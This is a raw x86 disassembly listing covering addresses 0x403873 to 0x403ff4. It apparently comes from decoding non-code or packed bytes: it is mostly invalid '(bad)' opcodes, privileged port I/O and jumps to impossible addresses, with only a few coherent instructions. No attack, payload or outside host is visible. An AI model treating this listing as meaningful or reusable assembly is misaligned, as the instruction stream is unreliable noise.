  403873:	adc    BYTE PTR [esp+eiz*4-0x7f],cl
  403877:	mov    eax,ds:0xbb0ecd3b
  40387c:	or     BYTE PTR ds:0x66074d28,ah
  403882:	xchg   ebx,eax
  403883:	xchg   esi,eax
  403884:	push   edx
  403885:	(bad)  
  403886:	mov    bh,BYTE PTR [ebp+0x24]
  403889:	mov    bl,0x3c
  40388b:	(bad)  
  40388c:	retfw  0x508c
  403890:	push   0x33
  403892:	imul   eax,DWORD PTR [ecx],0xb5fc085
  403898:	pop    ss
  403899:	scas   eax,DWORD PTR es:[edi]
  40389a:	loopne 0x403848
  40389c:	loopne 0x4038b6
  40389e:	ins    DWORD PTR es:[edi],dx
  40389f:	and    ch,BYTE PTR [edx+edx*8-0x46]
  4038a3:	sbb    esp,DWORD PTR [ebx-0x49ac1298]
  4038a9:	inc    esi
  4038aa:	(bad)  
  4038ab:	jge    0x4038e7
  4038ad:	fldenv gs:[edx-0x43]
  4038b1:	sbb    DWORD PTR [edx+edx*4+0x7e528129],esp
  4038b8:	inc    edi
  4038b9:	leave  
  4038ba:	and    ecx,edx
  4038bc:	mov    ecx,ebx
  4038be:	repnz mov dl,0x8a
  4038c1:	add    al,0x8
  4038c3:	jmp    0x403b62
  4038c8:	into   
  4038c9:	rol    esi,cl
  4038cb:	ror    ecx,0xd9
  4038ce:	(bad)  
  4038d0:	mov    ebp,0xd1d405f3
  4038d5:	fsubr  st,st(0)
  4038d7:	add    eax,0x78781d14
  4038dc:	(bad)  
  4038dd:	jle    0x403957
  4038df:	js     0x403877
  4038e1:	cmp    al,0x1
  4038e3:	or     ch,dl
  4038e5:	cmp    al,0xd1
  4038e7:	pop    ecx
  4038e8:	jmp    0x59103a11
  4038ed:	pusha  
  4038ee:	xchg   esi,eax
  4038ef:	fist   WORD PTR [eax]
  4038f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4038f2:	mov    al,0xa7
  4038f4:	out    0x3b,al
  4038f6:	outs   dx,DWORD PTR ds:[esi]
  4038f7:	stos   BYTE PTR es:[edi],al
  4038f8:	mov    ebp,0x3238142c
  4038fd:	(bad)  
  4038fe:	sahf   
  4038ff:	add    esp,edi
  403901:	xchg   ebx,eax
  403902:	(bad)  
  403903:	js     0x40395c
  403905:	and    BYTE PTR [ecx+eiz*1-0x3fbccab2],al
  40390c:	sti    
  40390d:	push   ds
  40390e:	ror    BYTE PTR [edi+0x5e],cl
  403911:	inc    eax
  403912:	fisub  DWORD PTR ds:0xf5a68b38
  403918:	test   al,0x62
  40391a:	stos   BYTE PTR es:[edi],al
  40391b:	ret    0xab90
  40391e:	scas   al,BYTE PTR es:[edi]
  40391f:	loope  0x40390c
  403921:	mov    ebx,0x101dd4f9
  403926:	and    ch,ch
  403928:	xor    eax,0x9f221403
  40392d:	cmp    al,0x43
  40392f:	mov    bh,al
  403931:	jmp    0x403902
  403933:	call   0x91c032f4
  403938:	mov    eax,0x1039a054
  40393d:	and    eax,0xc0b31eb1
  403942:	dec    ebx
  403943:	loopne 0x4038f6
  403945:	push   es
  403946:	pop    esi
  403947:	popf   
  403948:	pop    esi
  403949:	xchg   BYTE PTR [ebx],dl
  40394b:	dec    edi
  40394c:	push   ebx
  40394d:	std    
  40394e:	lods   eax,DWORD PTR ds:[esi]
  40394f:	pop    ebp
  403950:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403951:	cmp    BYTE PTR [edi],ah
  403953:	aad    0xc2
  403955:	dec    ecx
  403956:	mov    bh,0x4c
  403958:	sub    BYTE PTR [esi+0x35],dh
  40395b:	jmp    0x40392f
  40395d:	js     0x40392e
  40395f:	mov    eax,ds:0x33f37d11
  403964:	fs in  al,0xfd
  403967:	repnz mov ds:0x9bd88213,eax
  40396d:	sub    BYTE PTR [edi],dl
  40396f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403970:	test   eax,0x50ae113b
  403975:	in     eax,0x14
  403977:	test   DWORD PTR [ecx],esi
  403979:	out    dx,al
  40397a:	shl    BYTE PTR [edx+0x60],cl
  40397d:	jmp    0xc04d:0x75fdd1ed
  403984:	sub    ebp,ecx
  403986:	retf   0x10e5
  403989:	jne    0x4039c7
  40398b:	sub    eax,0x2825730c
  403990:	ret    0xfa42
  403993:	pop    ebx
  403994:	push   esp
  403995:	and    ch,bl
  403997:	xlat   BYTE PTR ds:[ebx]
  403998:	push   esp
  403999:	mov    ebp,0xf5480d25
  40399e:	stos   BYTE PTR es:[edi],al
  40399f:	adc    edi,DWORD PTR [edi-0x3d]
  4039a2:	sbb    BYTE PTR [esi+ebx*8+0x3511f92c],dl
  4039a9:	pop    ss
  4039aa:	sti    
  4039ab:	or     eax,0x56977b4d
  4039b0:	mov    edx,0x529a16c3
  4039b5:	ret    0xf02d
  4039b8:	sub    cl,0xdf
  4039bb:	pusha  
  4039bc:	out    0x68,eax
  4039be:	in     eax,dx
  4039bf:	mov    eax,ds:0x3a57d433
  4039c4:	or     BYTE PTR [eax],ah
  4039c6:	sub    dl,BYTE PTR [ecx]
  4039c8:	mov    edx,eax
  4039ca:	mov    ds:0xb95dfdf,eax
  4039cf:	push   ebx
  4039d0:	jmp    0x4039c6
  4039d2:	or     DWORD PTR [edx+0x3a],esp
  4039d5:	mov    ds:0xaca2b512,al
  4039da:	out    dx,al
  4039db:	out    0x61,eax
  4039dd:	cli    
  4039de:	xlat   BYTE PTR ds:[ebx]
  4039df:	xchg   ebp,eax
  4039e0:	retf   0x1a4a
  4039e3:	push   0x67
  4039e5:	and    ah,0x91
  4039e8:	push   0x87f4a027
  4039ed:	aas    
  4039ee:	dec    eax
  4039ef:	pop    ds
  4039f0:	add    ah,dl
  4039f2:	js     0x403974
  4039f4:	daa    
  4039f5:	cmp    ebp,edi
  4039f7:	out    0x4b,al
  4039f9:	add    BYTE PTR [eax-0x13],dh
  4039fc:	cmp    dl,dl
  4039fe:	sub    DWORD PTR ds:0x29bf1073,edx
  403a04:	add    bl,BYTE PTR [ecx+0x278888de]
  403a0a:	fidivr WORD PTR [edi-0x35]
  403a0d:	not    BYTE PTR [edi+eiz*8+0x4d]
  403a11:	sbb    esi,DWORD PTR [ebp-0x25aab6b0]
  403a17:	xor    al,BYTE PTR [esi-0x6fd8faf5]
  403a1d:	repz jecxz 0x4039cc
  403a20:	push   es
  403a21:	sbb    BYTE PTR [eax],bl
  403a23:	adc    al,0xc4
  403a25:	fcomp  DWORD PTR [esp+esi*2-0x2f64b809]
  403a2c:	aas    
  403a2d:	sub    dh,al
  403a2f:	rcr    DWORD PTR [eax-0x43],cl
  403a32:	das    
  403a33:	out    dx,al
  403a34:	test   BYTE PTR ds:0xdc0203ad,0x72
  403a3b:	lds    edx,FWORD PTR [esi+0x1e23cc0d]
  403a41:	aam    0x1c
  403a43:	push   esi
  403a44:	sub    DWORD PTR [esi-0x1a],0x8218ff53
  403a4b:	stos   BYTE PTR es:[edi],al
  403a4c:	popf   
  403a4d:	adc    DWORD PTR [eax-0x402b6e58],ebx
  403a53:	add    ah,BYTE PTR [edi+0x38fbdf3c]
  403a59:	cmc    
  403a5a:	pop    ebp
  403a5b:	xchg   BYTE PTR ds:0xb71dce84,al
  403a61:	cmp    dh,BYTE PTR [ecx+0x1a]
  403a64:	inc    edi
  403a65:	xchg   ecx,eax
  403a66:	sub    ecx,DWORD PTR [edx+0x3e]
  403a69:	cmp    BYTE PTR [edi],0xa
  403a6c:	inc    edx
  403a6d:	pusha  
  403a6e:	sub    eax,ebx
  403a70:	out    dx,eax
  403a71:	dec    esi
  403a72:	mov    dl,0xc9
  403a74:	mov    eax,ds:0xe3e9bf30
  403a79:	and    eax,0x213a4dd5
  403a7e:	sub    eax,0x5621cf4f
  403a83:	and    BYTE PTR [esi+ecx*4],al
  403a86:	mov    BYTE PTR [ebx+ebx*8],al
  403a89:	push   ds
  403a8a:	fs mov ebx,0x827b8b22
  403a90:	xor    esp,DWORD PTR [ebp-0x4f]
  403a93:	fcmove st,st(2)
  403a95:	sahf   
  403a96:	inc    edi
  403a97:	inc    ecx
  403a98:	mov    ebp,cr1
  403a9b:	xor    al,0x89
  403a9d:	pushf  
  403a9e:	dec    ebp
  403a9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403aa0:	sbb    ah,0xb3
  403aa3:	sbb    esp,DWORD PTR fs:[ebp-0x45]
  403aa7:	add    BYTE PTR ds:0xbffd4e9b,bh
  403aad:	fisttp WORD PTR [esi-0x5700175a]
  403ab3:	addr16 push esp
  403ab5:	sub    BYTE PTR [ecx+0x78f8f503],dh
  403abb:	mov    BYTE PTR [esi],bl
  403abd:	stos   BYTE PTR es:[edi],al
  403abe:	adc    ebp,DWORD PTR [edx+ecx*1-0x65]
  403ac2:	test   BYTE PTR [edx-0x4a76a97c],bh
  403ac8:	nop
  403ac9:	xchg   dh,cl
  403acb:	or     BYTE PTR [ebp-0x781750ca],ch
  403ad1:	dec    edx
  403ad2:	jge    0x403b0a
  403ad4:	push   es
  403ad5:	or     ecx,esp
  403ad7:	dec    eax
  403ad8:	jmp    0x403ac0
  403ada:	adc    eax,0xafbe114a
  403adf:	sar    BYTE PTR [esi],1
  403ae1:	push   ss
  403ae2:	rol    DWORD PTR [edi],1
  403ae4:	in     eax,0x9d
  403ae6:	xor    ebp,DWORD PTR [edi]
  403ae8:	or     eax,0x684f33b6
  403aed:	mov    ah,0xb7
  403aef:	hlt    
  403af0:	jnp    0x403aa2
  403af2:	daa    
  403af3:	inc    ecx
  403af4:	push   ebp
  403af5:	pushf  
  403af6:	ins    DWORD PTR es:[edi],dx
  403af7:	mov    bl,0xb
  403af9:	cmp    BYTE PTR [edi+0x1e15a76b],bh
  403aff:	nop
  403b00:	push   0x1d570d49
  403b05:	out    0x40,eax
  403b07:	sbb    al,0xfb
  403b09:	lods   al,BYTE PTR ds:[esi]
  403b0a:	pop    ebx
  403b0b:	pushf  
  403b0c:	xchg   ebp,eax
  403b0d:	test   DWORD PTR [edx+ecx*1+0x2c246289],0xf2ea43d
  403b18:	daa    
  403b19:	xor    BYTE PTR [edi+0xc],cl
  403b1c:	(bad)  
  403b1d:	scas   eax,DWORD PTR es:[edi]
  403b1e:	inc    edx
  403b1f:	xor    ebx,ebx
  403b21:	scas   al,BYTE PTR es:[edi]
  403b22:	rcr    DWORD PTR [esp+ecx*1],cl
  403b25:	(bad)  
  403b27:	mov    ds,ebp
  403b29:	test   al,0xa9
  403b2b:	retfw  
  403b2d:	call   0x1f6a6e28
  403b32:	in     eax,dx
  403b33:	or     bl,BYTE PTR [eax-0x749b5b4]
  403b39:	pop    ecx
  403b3a:	cmp    cl,bl
  403b3c:	inc    ebp
  403b3d:	dec    esi
  403b3e:	mov    ebx,0x81c9a9d3
  403b43:	xchg   esp,eax
  403b44:	push   ebx
  403b45:	sub    BYTE PTR [ebp-0x35],bh
  403b48:	adc    ecx,DWORD PTR [ebx+0x47]
  403b4b:	dec    esp
  403b4c:	adc    al,0x4a
  403b4e:	pop    edi
  403b4f:	lds    eax,FWORD PTR [eax-0x1e8746d]
  403b55:	sti    
  403b56:	sub    eax,0x4261759f
  403b5b:	in     eax,dx
  403b5c:	addr16 jo 0x403b4d
  403b5f:	adc    eax,0x3b043d26
  403b64:	xor    al,0x43
  403b66:	cmp    al,0xc5
  403b68:	je     0x4040bd
  403b6e:	jmp    0x403e0d
  403b73:	leave  
  403b74:	rol    dl,cl
  403b76:	rcr    ecx,cl
  403b78:	rcr    ecx,cl
  403b7a:	(bad)  
  403b7c:	ss push edx
  403b7e:	fwait
  403b7f:	push   ds
  403b80:	int    0x64
  403b82:	bound  ebx,QWORD PTR [edx-0x18787dd]
  403b88:	jle    0x403c02
  403b8a:	js     0x403bb4
  403b8c:	inc    esi
  403b8d:	xchg   ecx,eax
  403b8e:	xchg   ebx,eax
  403b8f:	sub    cl,BYTE PTR [edi+0x5b]
  403b92:	in     al,0x94
  403b94:	jno    0x403b65
  403b96:	pusha  
  403b97:	retf   
  403b98:	cs mov dl,0x45
  403b9b:	enter  0xf3d4,0x51
  403b9f:	mov    eax,ds:0xaf9d02fd
  403ba4:	lock mov al,0xa9
  403ba7:	ret    
  403ba8:	les    edx,FWORD PTR [edx]
  403baa:	sbb    al,0xb6
  403bac:	mov    al,ds:0x1fa15efe
  403bb1:	add    al,0x93
  403bb3:	std    
  403bb4:	cwde   
  403bb5:	sbb    dh,bh
  403bb7:	mov    cl,0xc8
  403bb9:	retf   0x5aa5
  403bbc:	add    eax,eax
  403bbe:	xor    al,0x97
  403bc0:	or     ah,ah
  403bc2:	ret    0x50bf
  403bc5:	mov    ah,0x5d
  403bc7:	addr16 sbb al,0x5f
  403bca:	mov    edi,0xd0bf62e0
  403bcf:	dec    edx
  403bd0:	dec    edx
  403bd1:	cmp    bh,ch
  403bd3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403bd4:	xor    ah,BYTE PTR [ebx]
  403bd6:	sub    BYTE PTR [ecx-0x43],bh
  403bd9:	(bad)  
  403bda:	dec    esi
  403bdb:	push   ebp
  403bdc:	adc    al,0xf7
  403bde:	push   cs
  403bdf:	cwde   
  403be0:	aas    
  403be1:	outs   dx,DWORD PTR ds:[esi]
  403be2:	sbb    al,0x47
  403be4:	loope  0x403bbf
  403be6:	loope  0x403b78
  403be8:	inc    ebp
  403be9:	sbb    esi,DWORD PTR [ecx-0x42]
  403bec:	xchg   ebx,eax
  403bed:	xor    DWORD PTR [esi],ebx
  403bef:	shl    edi,0xc8
  403bf2:	ins    BYTE PTR es:[edi],dx
  403bf3:	mov    bh,0x91
  403bf5:	mov    WORD PTR [ebx-0x5e0d35a4],fs
  403bfb:	or     DWORD PTR [edi],esi
  403bfd:	inc    ebx
  403bfe:	hlt    
  403bff:	inc    ecx
  403c00:	sbb    ah,BYTE PTR [edx]
  403c02:	test   BYTE PTR [eax+0x513a5138],0x5
  403c09:	(bad)  
  403c0b:	or     BYTE PTR [ebx-0x375f0e07],dl
  403c11:	popf   
  403c12:	add    al,0x47
  403c14:	add    BYTE PTR [eax+0xad3ef23],0xd1
  403c1b:	adc    cl,BYTE PTR [esi+0x61]
  403c1e:	push   ebp
  403c1f:	mov    edx,0x1a8d916a
  403c24:	loope  0x403c4e
  403c26:	in     eax,dx
  403c27:	jns    0x403bea
  403c29:	add    al,BYTE PTR [ebx+0x1f]
  403c2c:	pushf  
  403c2d:	jae    0x403c71
  403c2f:	dec    BYTE PTR [ebp-0x42]
  403c32:	jnp    0x403c30
  403c34:	push   edi
  403c35:	inc    esp
  403c36:	push   ss
  403c37:	ds mov ah,0xdd
  403c3a:	retf   
  403c3b:	cmp    BYTE PTR [ecx-0x70],0x9d
  403c3f:	xchg   ebx,eax
  403c40:	pop    es
  403c41:	inc    edi
  403c42:	or     cl,BYTE PTR [ebp-0x2e]
  403c45:	pop    esi
  403c46:	enter  0x35cc,0xbd
  403c4a:	jns    0x403c6a
  403c4c:	pop    ebx
  403c4d:	inc    esi
  403c4e:	mov    ebx,0xe40339ee
  403c53:	pop    eax
  403c54:	pop    esp
  403c55:	and    DWORD PTR [esi+edi*4-0x66],0x37
  403c5a:	xchg   edi,eax
  403c5b:	cmc    
  403c5c:	xor    DWORD PTR es:[eax],ecx
  403c5f:	and    edi,esp
  403c61:	inc    ecx
  403c62:	in     eax,dx
  403c63:	js     0x403be9
  403c65:	mov    dh,0xb0
  403c67:	out    dx,al
  403c68:	dec    edi
  403c69:	cwde   
  403c6a:	cmp    DWORD PTR [eax],0x1e3647cb
  403c70:	pop    es
  403c71:	out    0x1f,eax
  403c73:	jp     0x403c1b
  403c75:	and    DWORD PTR [ebx],esi
  403c77:	rcr    BYTE PTR [ecx+esi*2],cl
  403c7a:	sbb    ebp,ebp
  403c7c:	jno    0x403ce3
  403c7e:	lea    edx,[ecx]
  403c80:	repz pop edx
  403c82:	fisttp WORD PTR [ebp+0x8]
  403c85:	cmp    al,0xfa
  403c87:	xchg   ebx,eax
  403c88:	jmp    0xaa770aab
  403c8d:	jmp    0xed859aeb
  403c92:	shl    edi,cl
  403c94:	call   0x8e65:0xcc69abe8
  403c9b:	adc    bh,BYTE PTR [ebx+0x28]
  403c9e:	push   0x777f3864
  403ca3:	lea    edx,[eax+0x1c]
  403ca6:	pushf  
  403ca7:	push   ebp
  403ca8:	inc    eax
  403ca9:	(bad)  
  403cab:	mov    ds:0xd04c335b,al
  403cb0:	bound  ebp,QWORD PTR [edx]
  403cb2:	xchg   ebp,eax
  403cb3:	xchg   esi,eax
  403cb4:	out    dx,eax
  403cb5:	das    
  403cb6:	jns    0x403cc1
  403cb8:	mov    ebp,0x9b6caa61
  403cbd:	lods   eax,DWORD PTR ds:[esi]
  403cbe:	jne    0x403d01
  403cc0:	jnp    0x403c91
  403cc2:	(bad)  
  403cc4:	call   0x6b3e4db7
  403cc9:	rcr    DWORD PTR [edi+0x141dfabc],cl
  403ccf:	xchg   edx,eax
  403cd0:	mov    ebx,0xd137f4f5
  403cd5:	push   esp
  403cd6:	dec    ecx
  403cd7:	ins    BYTE PTR es:[edi],dx
  403cd8:	aam    0x6b
  403cda:	xchg   ebx,eax
  403cdb:	(bad)  
  403cdc:	push   esp
  403cdd:	or     esi,esi
  403cdf:	dec    edx
  403ce0:	pop    edx
  403ce1:	pop    eax
  403ce2:	retf   
  403ce3:	pop    eax
  403ce4:	sub    eax,0x879d3e62
  403ce9:	cmp    al,0xf4
  403ceb:	rcl    DWORD PTR [edi+edx*4-0x30],cl
  403cef:	test   eax,0x4c06af10
  403cf4:	cmp    BYTE PTR [eax+0x1da16cf3],ch
  403cfa:	das    
  403cfb:	or     eax,0x284283b
  403d00:	lods   eax,DWORD PTR ds:[esi]
  403d01:	fimul  DWORD PTR [edi]
  403d03:	ins    BYTE PTR es:[edi],dx
  403d04:	pop    esp
  403d05:	pop    es
  403d06:	xor    al,0xe3
  403d08:	mov    eax,ds:0xdcf03775
  403d0d:	es cmp eax,0x6ff3ba2d
  403d13:	bound  esp,QWORD PTR [esi+0x5]
  403d16:	push   ebx
  403d17:	mov    al,0x2b
  403d19:	daa    
  403d1a:	mov    ch,ch
  403d1c:	bound  edi,QWORD PTR [edi-0x2390539f]
  403d22:	in     al,0x78
  403d24:	call   0x7c63b586
  403d29:	test   al,0x89
  403d2b:	push   ss
  403d2c:	or     al,0xd9
  403d2e:	jae    0x403d2e
  403d30:	ret    0xfa2d
  403d33:	bound  ebx,QWORD PTR [ecx+edx*2+0x464148a2]
  403d3a:	xchg   esi,eax
  403d3b:	push   ebp
  403d3c:	sbb    al,0x28
  403d3e:	scas   al,BYTE PTR es:[edi]
  403d3f:	adc    DWORD PTR [edx+0x55],ebp
  403d42:	xor    edi,DWORD PTR [ebp-0x56]
  403d45:	imul   esi,DWORD PTR [ebx-0x4d78a6bd],0xeb407906
  403d4f:	dec    ecx
  403d50:	mov    ah,0xb1
  403d52:	enter  0xbb03,0xa4
  403d56:	mov    esp,0xa4ab4bdb
  403d5b:	pop    ebx
  403d5c:	adc    ch,BYTE PTR [esi+0x6f]
  403d5f:	or     ecx,ecx
  403d61:	into   
  403d62:	mov    dh,0x40
  403d64:	repz jo 0x403dc3
  403d67:	scas   eax,DWORD PTR es:[edi]
  403d68:	sub    BYTE PTR [ebx],cl
  403d6a:	adc    bh,BYTE PTR [ecx-0x5]
  403d6d:	xor    ebx,DWORD PTR [ebx-0xc]
  403d70:	jne    0x403d28
  403d72:	mov    ebp,0xc394919a
  403d77:	fisubr DWORD PTR [esi+0x2f6df01d]
  403d7d:	je     0x403d5a
  403d7f:	push   ds
  403d80:	ins    DWORD PTR es:[edi],dx
  403d81:	scas   al,BYTE PTR es:[edi]
  403d82:	jae    0x403d1e
  403d84:	inc    edi
  403d85:	xor    BYTE PTR [eax-0x15],dl
  403d88:	sub    al,0x93
  403d8a:	dec    ebp
  403d8b:	imul   ebx,DWORD PTR [ecx-0x20],0x8b91e16
  403d92:	pop    ds
  403d93:	mov    ds:0x90ba6ebb,eax
  403d98:	pop    edi
  403d99:	dec    ebx
  403d9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d9b:	add    al,0xfe
  403d9d:	fwait
  403d9e:	mov    DWORD PTR [esi+eiz*8-0x65],ebp
  403da2:	jmp    0x403d7e
  403da4:	mov    bl,0xad
  403da6:	pop    esp
  403da7:	jl     0x403def
  403da9:	out    dx,eax
  403daa:	mov    WORD PTR ds:0xda69fa98,es
  403db0:	fcomi  st,st(6)
  403db2:	push   es
  403db3:	gs push esi
  403db5:	data16 lahf 
  403db7:	cmp    eax,0x1aac9eec
  403dbc:	mov    BYTE PTR [ebp+0x15facd5f],0x55
  403dc3:	(bad)  
  403dc4:	imul   esp,DWORD PTR [esi+0x3],0x42
  403dc8:	lock mov esi,DWORD PTR [esi]
  403dcb:	nop
  403dcc:	lods   eax,DWORD PTR ds:[esi]
  403dcd:	sub    BYTE PTR [ebx],cl
  403dcf:	add    DWORD PTR [edi-0x1d],ebx
  403dd2:	aad    0x65
  403dd4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403dd5:	sub    DWORD PTR ds:0xe1443a2e,edi
  403ddb:	push   edx
  403ddc:	call   0x4a52:0x4de831df
  403de3:	add    DWORD PTR [ebx-0x31],0x65
  403de7:	xchg   esp,eax
  403de8:	xlat   BYTE PTR ds:[ebx]
  403de9:	mov    ch,0x5
  403deb:	push   ecx
  403dec:	push   esp
  403ded:	sub    BYTE PTR [ecx-0x3e033221],cl
  403df3:	mov    eax,DWORD PTR [esi-0x9]
  403df6:	pop    eax
  403df7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403df8:	push   ds
  403df9:	daa    
  403dfa:	lahf   
  403dfb:	repnz retf 
  403dfd:	and    BYTE PTR [ebx],ah
  403dff:	jl     0x403deb
  403e01:	cmp    eax,0xf49d0ed5
  403e06:	push   0xfffffffc
  403e08:	pop    edx
  403e09:	xchg   ebp,eax
  403e0a:	addr16 mov ch,0xd4
  403e0d:	mov    eax,DWORD PTR [ebp+0x8]
  403e10:	mov    ecx,DWORD PTR [ebp-0x8]
  403e13:	xor    eax,esi
  403e15:	add    eax,edi
  403e17:	mov    DWORD PTR [ecx],eax
  403e19:	jmp    0x404380
  403e1e:	jmp    0x4040bd
  403e23:	ds retf 0xcdca
  403e27:	retf   0xd9cd
  403e2a:	fldenv ds:0xefdd8593
  403e30:	pop    esp
  403e31:	sbb    DWORD PTR [ebp+0x18],ecx
  403e34:	and    BYTE PTR [eax+0x78],bh
  403e37:	(bad)  
  403e38:	jle    0x403eb2
  403e3a:	js     0x403def
  403e3c:	pop    edx
  403e3d:	and    BYTE PTR [esi-0x51eacb27],cl
  403e43:	and    esi,ecx
  403e45:	div    BYTE PTR [eax+0x3a]
  403e48:	add    esp,DWORD PTR [edi+0x2f57189b]
  403e4e:	cld    
  403e4f:	lahf   
  403e50:	into   
  403e51:	push   ds
  403e52:	jno    0x403e3c
  403e54:	in     eax,dx
  403e55:	jmp    0x16b9:0x968fa71c
  403e5c:	add    DWORD PTR [edi+0x1d],ecx
  403e5f:	stos   DWORD PTR es:[edi],eax
  403e60:	inc    edx
  403e61:	adc    eax,0xa629e8e
  403e66:	rol    BYTE PTR [eax+0x39],0x66
  403e6a:	lods   eax,DWORD PTR ds:[esi]
  403e6b:	shr    bl,0x80
  403e6e:	dec    ebx
  403e6f:	ror    ch,cl
  403e71:	stos   BYTE PTR es:[edi],al
  403e72:	test   DWORD PTR [esi+0x6e],esi
  403e75:	jge    0x403ead
  403e77:	sbb    eax,0x2b349bb
  403e7c:	(bad)  
  403e7d:	xor    al,0xae
  403e7f:	jmp    0x403e88
  403e81:	ja     0x403efb
  403e83:	or     DWORD PTR [esi+esi*4],ecx
  403e86:	mov    bl,0xd3
  403e88:	mov    ds:0x165f69e4,al
  403e8d:	push   esp
  403e8e:	sbb    al,0xc8
  403e90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403e91:	mov    al,0x7b
  403e93:	sbb    esi,DWORD PTR [ebx+0x12]
  403e96:	xor    eax,0x662f75c
  403e9b:	inc    edi
  403e9c:	cmp    dl,BYTE PTR [esi]
  403e9e:	xor    cl,BYTE PTR [eax+0xf523e58]
  403ea4:	pushf  
  403ea5:	push   eax
  403ea6:	jge    0x403ed4
  403ea8:	or     dl,BYTE PTR ds:0xbf47caf9
  403eae:	xchg   DWORD PTR [edi-0x1b2e167f],esi
  403eb4:	and    DWORD PTR [edx],ebx
  403eb6:	jae    0x403efb
  403eb8:	pop    esi
  403eb9:	dec    edi
  403eba:	imul   esi,DWORD PTR [edi+edi*1+0x37],0x446b7534
  403ec2:	in     al,dx
  403ec3:	repnz pop ds
  403ec5:	fsubrp st(5),st
  403ec7:	or     ebp,DWORD PTR [edx]
  403ec9:	mov    dl,0x35
  403ecb:	xchg   edi,eax
  403ecc:	mov    cl,0x48
  403ece:	stos   BYTE PTR es:[edi],al
  403ecf:	and    al,0x7e
  403ed1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403ed2:	push   ds
  403ed3:	push   cs
  403ed4:	push   edx
  403ed5:	xor    DWORD PTR [ebx],edi
  403ed7:	sbb    edi,edx
  403ed9:	pop    eax
  403eda:	push   ecx
  403edb:	jo     0x403f5c
  403edd:	push   es
  403ede:	jge    0x403eb7
  403ee0:	pop    esp
  403ee1:	(bad)  
  403ee2:	push   ds
  403ee3:	(bad)  
  403ee4:	(bad)  
  403ee5:	mov    dh,0xd0
  403ee7:	pop    ebp
  403ee8:	add    esi,DWORD PTR [edi]
  403eea:	sbb    ebx,DWORD PTR ds:0x8174e30e
  403ef0:	in     al,dx
  403ef1:	jp     0x403f3c
  403ef3:	push   esi
  403ef4:	xor    DWORD PTR [ecx-0x3c],edi
  403ef7:	leave  
  403ef8:	out    dx,eax
  403ef9:	push   cs
  403efa:	mov    al,ds:0x95cf3898
  403eff:	cmp    esi,DWORD PTR [di+0x57]
  403f03:	mov    ch,0x1f
  403f05:	mov    eax,ds:0x6facf9c0
  403f0a:	imul   esp,edi,0x5c50f7d1
  403f10:	jg     0x403ea3
  403f12:	push   edi
  403f13:	inc    eax
  403f14:	popf   
  403f15:	adc    BYTE PTR [ecx-0x52070af5],bl
  403f1b:	aas    
  403f1c:	aam    0x3
  403f1e:	mov    dh,0x74
  403f20:	lods   eax,DWORD PTR es:[esi]
  403f22:	stc    
  403f23:	mov    bl,0x7
  403f25:	aad    0x95
  403f27:	icebp  
  403f28:	das    
  403f29:	jp     0x403ec1
  403f2b:	ret    0x5649
  403f2e:	jo     0x403f69
  403f30:	aad    0x0
  403f32:	out    dx,al
  403f33:	mov    dl,0xd4
  403f35:	jmp    0x403ef2
  403f37:	aad    0xad
  403f39:	fistp  DWORD PTR [esp+ecx*2+0x4f]
  403f3d:	test   ch,al
  403f3f:	push   esi
  403f40:	ja     0x403f0b
  403f42:	je     0x403f04
  403f44:	xor    ah,al
  403f46:	xchg   esp,eax
  403f47:	lea    edi,[esi+0x74c9a250]
  403f4d:	(bad)  
  403f4e:	retf   
  403f4f:	fimul  DWORD PTR [eax-0x6d651eaa]
  403f55:	lds    esi,FWORD PTR [ecx]
  403f57:	dec    edx
  403f58:	arpl   WORD PTR ds:0x5845a74c,bp
  403f5e:	fbstp  TBYTE PTR [si+0x38]
  403f62:	ins    BYTE PTR es:[edi],dx
  403f63:	sar    BYTE PTR [edi],1
  403f65:	popa   
  403f66:	mov    edi,0xf6e28ac2
  403f6b:	xchg   BYTE PTR [ecx+0x40],bh
  403f6e:	push   es
  403f6f:	ss hlt 
  403f71:	dec    ecx
  403f72:	fld    DWORD PTR [esi+eax*4]
  403f75:	sub    edi,DWORD PTR [ecx]
  403f77:	aas    
  403f78:	pop    esi
  403f79:	cld    
  403f7a:	and    bl,ch
  403f7c:	ins    BYTE PTR es:[edi],dx
  403f7d:	popa   
  403f7e:	stos   BYTE PTR es:[edi],al
  403f7f:	jg     0x403f50
  403f81:	int    0x33
  403f83:	mov    esp,0xb956f85a
  403f88:	dec    eax
  403f89:	loopne 0x403fd1
  403f8b:	sbb    dl,BYTE PTR [ecx-0x73]
  403f8e:	push   es
  403f8f:	push   es
  403f90:	jne    0x403fbb
  403f92:	jbe    0x403fd9
  403f94:	in     eax,0xb3
  403f96:	aad    0x65
  403f98:	jmp    0x909e:0xa20bae1f
  403f9f:	mov    dl,0xfe
  403fa1:	pop    ecx
  403fa2:	lock jp 0x403ff7
  403fa5:	mov    BYTE PTR [eax+eax*4-0x71],dl
  403fa9:	push   edx
  403faa:	push   ecx
  403fab:	add    bh,cl
  403fad:	arpl   ax,bx
  403faf:	xor    BYTE PTR [ecx-0x55],bh
  403fb2:	mov    ah,0x8d
  403fb4:	aad    0x9c
  403fb6:	adc    al,0x67
  403fb8:	xor    ch,al
  403fba:	(bad)  
  403fbb:	aaa    
  403fbc:	xor    al,0x50
  403fbe:	fsubr  QWORD PTR [ecx-0x2d]
  403fc1:	xor    eax,0xf9e95728
  403fc6:	sub    ecx,ecx
  403fc8:	sub    edi,DWORD PTR [edx-0x213fa513]
  403fce:	xchg   DWORD PTR [edx],edx
  403fd0:	push   edx
  403fd1:	(bad)  [ebx+0x5c847a8b]
  403fd7:	mov    esi,0xa6e3c22
  403fdc:	jecxz  0x403fde
  403fde:	and    DWORD PTR [esi-0x7be36521],ebp
  403fe4:	jecxz  0x404003
  403fe6:	outs   dx,BYTE PTR ds:[esi]
  403fe7:	pop    ds
  403fe8:	in     eax,dx
  403fe9:	lock sbb al,0xe0
  403fec:	mov    ah,0x7c
  403fee:	in     eax,dx
  403fef:	aad    0xb2
  403ff1:	retf   
  403ff2:	mov    ah,0xe8
  403ff4:	jecxz  0x404060
